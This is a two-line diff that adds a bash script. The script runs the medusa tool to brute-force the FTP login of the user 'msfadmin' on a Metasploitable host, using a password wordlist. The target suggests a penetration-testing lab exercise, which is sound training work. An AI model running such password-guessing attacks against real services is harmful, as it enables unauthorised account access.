@@ -1,0 +1,2 @@
+#!/bin/bash
+medusa -h <IP-do-Metasploitable> -u msfadmin -P wordlists/wordlist.txt -M ftp
